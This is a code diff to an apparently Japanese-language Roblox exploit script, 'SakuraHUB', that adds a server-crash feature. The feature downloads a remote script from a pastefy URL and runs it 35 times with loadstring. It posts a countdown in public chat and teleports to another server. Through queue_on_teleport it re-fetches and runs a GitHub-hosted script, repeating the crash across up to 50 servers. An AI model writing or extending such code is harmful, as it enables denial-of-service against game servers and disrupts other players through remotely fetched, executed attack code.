@@ -4576,6 +4576,23 @@ do
     local Players = game:GetService("Players")
 
     -- ========================================================================
+    -- 設定
+    -- ========================================================================
+    local MAX_LOOP = 50
+    local CRASH_URL = "https://pastefy.app/sPciZuXM/raw"
+
+    -- ========================================================================
+    -- ループカウンタの永続化（テレポートを跨ぐ）
+    -- ========================================================================
+    local function getLoopCount()
+        return _G.SakuraCrashLoopCount or 0
+    end
+
+    local function setLoopCount(v)
+        _G.SakuraCrashLoopCount = v
+    end
+
+    -- ========================================================================
     -- チャット送信ヘルパー
     -- ========================================================================
     local function sendChatMessage(message, mode)
@@ -4586,7 +4603,7 @@ do
             if mode == "system" then
                 generalChannel:DisplaySystemMessage(message)
             else
-                generalChannel:SendAsync(message)
+                pcall(function() generalChannel:SendAsync(message) end)
             end
         else
             local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
@@ -4600,12 +4617,11 @@ do
     end
 
     -- ========================================================================
-    -- クラッシュスクリプト実行（35回連続）
+    -- クラッシュスクリプト実行
     -- ========================================================================
     local function runCrashScript()
-        local url = "https://pastefy.app/sPciZuXM/raw"
         local ok, err = pcall(function()
-            local scriptContent = game:HttpGet(url)
+            local scriptContent = game:HttpGet(CRASH_URL)
             for i = 1, 35 do
                 pcall(function()
                     loadstring(scriptContent)()
@@ -4617,20 +4633,18 @@ do
     end
 
     -- ========================================================================
-    -- 別サーバーの JobId を取得
+    -- 別サーバーJobId取得
     -- ========================================================================
     local function getAnotherServerJobId()
-        local placeId = game.PlaceId
-        local currentJobId = game.JobId
         local ok, result = pcall(function()
             local url = string.format(
                 "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
-                placeId
+                game.PlaceId
             )
-            local response = game:HttpGet(url)
-            return HttpService:JSONDecode(response)
+            return HttpService:JSONDecode(game:HttpGet(url))
         end)
         if ok and result and result.data then
+            local currentJobId = game.JobId
             for _, server in ipairs(result.data) do
                 if server.id and server.id ~= currentJobId then
                     return server.id
@@ -4648,19 +4662,31 @@ do
         local localPlayer = Players.LocalPlayer
         if targetJobId then
             local ok = pcall(function()
-                local teleportOptions = Instance.new("TeleportOptions")
-                teleportOptions.ServerInstanceId = targetJobId
-                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, teleportOptions)
+                local opts = Instance.new("TeleportOptions")
+                opts.ServerInstanceId = targetJobId
+                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
             end)
-            if ok then
-                return true
-            end
+            if ok then return true end
         end
-        -- フォールバック：Roblox が自動で別サーバーを選んでくれる
-        pcall(function()
-            TeleportService:Teleport(game.PlaceId, localPlayer)
-        end)
+        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
         return false
+    end
+
+    -- ========================================================================
+    -- カウントダウン本体（1回分）
+    -- onFinish: 「1」を送信した直後に呼ばれる関数
+    -- ========================================================================
+    local function runCountdownOnce(onFinish)
+        task.spawn(function()
+            pcall(function() sendChatMessage("SakuraHUB-by-Nuked", "normal") end)
+            task.wait(0.8)
+            pcall(function() sendChatMessage("5", "normal") end) task.wait(1)
+            pcall(function() sendChatMessage("4", "normal") end) task.wait(1)
+            pcall(function() sendChatMessage("3", "normal") end) task.wait(1)
+            pcall(function() sendChatMessage("2", "normal") end) task.wait(1)
+            pcall(function() sendChatMessage("1", "normal") end)
+            if onFinish then onFinish() end
+        end)
     end
 
     -- ========================================================================
@@ -4681,7 +4707,7 @@ do
     CrashTab:AddSection({ Name = "試験実行" })
 
     -- ========================================================================
-    -- 既存：サーバークラッシュテスト（35回連続）
+    -- 既存：35回連続クラッシュテスト
     -- ========================================================================
     CrashTab:AddButton({
         Name = "⚡ サーバークラッシュテスト（35回連続実行）",
@@ -4696,77 +4722,130 @@ do
                 local ok, err = runCrashScript()
                 if ok then
                     PlayActionSound()
-                    OrionLib:MakeNotification({
-                        Name = "完了",
-                        Content = "35回の実行が完了しました",
-                        Time = 5
-                    })
+                    OrionLib:MakeNotification({ Name = "完了", Content = "35回の実行が完了しました", Time = 5 })
                 else
                     PlayErrorSound()
-                    OrionLib:MakeNotification({
-                        Name = "エラー",
-                        Content = "実行中にエラーが発生しました: " .. tostring(err),
-                        Time = 5
-                    })
+                    OrionLib:MakeNotification({ Name = "エラー", Content = "失敗: " .. tostring(err), Time = 5 })
                 end
             end)
         end
     })
 
     -- ========================================================================
-    -- サーバークラッシュオートモード
-    -- カウントダウン → 「1」のタイミングでクラッシュ + 別サーバーへ
+    -- サーバークラッシュオートモード（単発）
     -- ========================================================================
     CrashTab:AddButton({
         Name = "サーバークラッシュオートモード",
         Callback = function()
             PlayActionSound()
-
-            task.spawn(function()
-                -- 1. 最初のメッセージ
-                pcall(function() sendChatMessage("SakuraHUB-by-Nuked", "normal") end)
-                task.wait(0.8)
-
-                -- 2. カウントダウン送信
-                pcall(function() sendChatMessage("5", "normal") end)
-                task.wait(1)
-                pcall(function() sendChatMessage("4", "normal") end)
-                task.wait(1)
-                pcall(function() sendChatMessage("3", "normal") end)
-                task.wait(1)
-                pcall(function() sendChatMessage("2", "normal") end)
-                task.wait(1)
-
-                -- 3. 「1」を送信した瞬間
-                pcall(function() sendChatMessage("1", "normal") end)
-
-                -- 4. テレポートを先に発火（クラッシュの影響を受けないよう1フレーム先行）
-                task.spawn(function()
-                    teleportToAnotherServer()
-                end)
-
-                -- 5. 1フレーム待ってからクラッシュスクリプトを実行
+            runCountdownOnce(function()
+                task.spawn(function() teleportToAnotherServer() end)
                 task.wait(0.1)
-
                 task.spawn(function()
                     local ok, err = runCrashScript()
                     if ok then
                         PlayActionSound()
-                        OrionLib:MakeNotification({
-                            Name = "完了",
-                            Content = "カウントダウン完了・クラッシュ実行・別サーバーへ移動中",
-                            Time = 4
-                        })
+                        OrionLib:MakeNotification({ Name = "完了", Content = "クラッシュ実行・別サーバーへ移動中", Time = 4 })
                     else
                         PlayErrorSound()
-                        OrionLib:MakeNotification({
-                            Name = "エラー",
-                            Content = "クラッシュスクリプト実行失敗: " .. tostring(err),
-                            Time = 5
-                        })
+                        OrionLib:MakeNotification({ Name = "エラー", Content = "失敗: " .. tostring(err), Time = 5 })
                     end
                 end)
             end)
+        end
+    })
+
+    -- ========================================================================
+    -- サーバークラッシュオートモード（50回ループ）
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "🔁 サーバークラッシュオートモード（50回ループ）",
+        Callback = function()
+            PlayActionSound()
+
+            -- queue_on_teleport の存在チェック
+            local hasQueue = (type(queue_on_teleport) == "function") or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
+
+            if not hasQueue then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "❌ 実行不可能",
+                    Content = "このエグゼキュータは queue_on_teleport に対応していません。テレポート後の自動再実行は不可能です。",
+                    Time = 8
+                })
+                return
+            end
+
+            -- 現在のループ回数
+            local count = getLoopCount() + 1
+
+            if count > MAX_LOOP then
+                PlayActionSound()
+                OrionLib:MakeNotification({
+                    Name = "🎉 全50回完了",
+                    Content = "50回のループが完了しました",
+                    Time = 6
+                })
+                setLoopCount(0)
+                return
+            end
+
+            OrionLib:MakeNotification({
+                Name = "🔁 ループ実行",
+                Content = string.format("%d / %d 回目を開始", count, MAX_LOOP),
+                Time = 3
+            })
+
+            -- 1回分のカウントダウン
+            runCountdownOnce(function()
+                -- 次のループ回数をカウントアップ
+                setLoopCount(count)
+
+                -- 次のサーバーで実行するスクリプトを準備
+                local nextScript = string.format([[
+_G.SakuraCrashLoopCount = %d
+if _G.SakuraCrashScriptLoaded then return end
+_G.SakuraCrashScriptLoaded = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/SakuraCrashLoop"))()
+]], count)
+
+                -- テレポート先で自動実行を予約
+                if type(queue_on_teleport) == "function" then
+                    pcall(function() queue_on_teleport(nextScript) end)
+                elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+                    pcall(function() syn.queue_on_teleport(nextScript) end)
+                end
+
+                -- テレポート発火
+                task.spawn(function() teleportToAnotherServer() end)
+                task.wait(0.1)
+
+                -- クラッシュ実行
+                task.spawn(function()
+                    local ok, err = runCrashScript()
+                    if ok then
+                        PlayActionSound()
+                    else
+                        PlayErrorSound()
+                        OrionLib:MakeNotification({ Name = "エラー", Content = tostring(err), Time = 4 })
+                    end
+                end)
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- ループカウンタ確認用
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "📊 現在のループ回数を確認",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "ループ状況",
+                Content = string.format("現在 %d / %d 回目です", getLoopCount(), MAX_LOOP),
+                Time = 4
+            })
         end
     })
 end
